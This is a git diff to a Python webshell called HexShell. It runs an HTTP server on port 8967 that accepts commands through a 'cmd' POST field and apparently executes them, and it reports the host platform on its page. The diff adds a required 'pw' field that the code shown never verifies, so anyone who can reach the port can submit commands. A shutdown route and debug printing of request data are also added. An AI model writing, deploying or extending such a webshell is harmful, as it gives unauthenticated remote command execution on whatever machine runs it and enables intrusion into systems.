@@ -1,5 +1,7 @@
 from http.server import BaseHTTPRequestHandler, HTTPServer
+import urllib.parse
 import subprocess
+import platform
 import requests
 
 print("""
@@ -12,7 +14,9 @@ print("""
 |__| |__||_______||__| |__||_______||__| |__||_______||_______||_______|
 """)
 
-INDEX = requests.get("https://raw.githubusercontent.com/Falcn8/hexshell/main/index.html").text
+INDEX = requests.get("https://raw.githubusercontent.com/Falcn8/hexshell/master/index.html").text
+
+INDEX = open("index.html").read()
 
 class Webshell(BaseHTTPRequestHandler):
     def _send_response(self, message):
@@ -22,17 +26,41 @@ class Webshell(BaseHTTPRequestHandler):
         self.wfile.write(bytes(message, "utf8"))
 
     def do_GET(self):
-        self._send_response(INDEX)
+        if self.path.lower() == "/favicon.ico":
+            self.send_response(400)
+            return
+        if self.path.lower() == "/close":
+            self.send_response(200)
+            self.send_header('Content-type', 'text/html')
+            self.end_headers()
+            self.wfile.write(b'Closing webserver')
+            httpd.server_close()
+            print("\nClose requested\nExiting...")
+            exit()
+        print(self.__dict__)
+        self._send_response(INDEX.replace("{{PLATFORM}}", str(platform.platform())))
 
     def do_POST(self):
         content_length = int(self.headers['Content-Length'])
         post_data = self.rfile.read(content_length).decode()
-        cmd = post_data.split("=")[1].replace("+", " ")
+        print(post_data)
+        query = urllib.parse.parse_qs(post_data)
+        print(query)
+        if not "cmd" in query or not "pw" in query:
+            self.send_response(400)
+            self.send_header('Content-type', 'text/html')
+            self.end_headers()
+            self.wfile.write(b'Please specify the command and the password')
+            return
+        cmd = query["cmd"]
+        print(cmd)
         self.send_response(200)
         self.send_header('Content-type', 'text/html')
         self.end_headers()
-        self.wfile.write(b'<!DOCTYPE html><html><head>')
+        self.wfile.write(b'<!DOCTYPE html><html><head><title>HexShell</title>')
+        self.wfile.write(b'<link rel="shortcut icon" href="https://github.com/Falcn8/HexShell/blob/master/HexShell.jpg?raw=true"/>')
         self.wfile.write(b'<link href="https://unpkg.com/tailwindcss@^2/dist/tailwind.min.css" rel="stylesheet">')
+        self.wfile.write(b'<style>@font-face {font-family:Inder;src:url("https://raw.githubusercontent.com/Falcn8/hexshell/master/Inder-Regular.ttf");}</style>')
         self.wfile.write(b'</head><body class="bg-gray-100">')
         self.wfile.write(b'<div class="bg-white p-6 rounded-lg shadow-md mx-auto my-10 max-w-screen-md overflow-auto">')
         self.wfile.write(b'<pre class="text-gray-700">')
@@ -49,6 +77,9 @@ class Webshell(BaseHTTPRequestHandler):
 httpd = HTTPServer(('', 8967), Webshell)
 print("Serving on port 8967\n")
 try:
-    httpd.serve_forever()
+    while True:
+        httpd.handle_request()
 except KeyboardInterrupt:
     print("\nCtrl-C detected\nExiting...")
+    httpd.server_close()
+    exit()
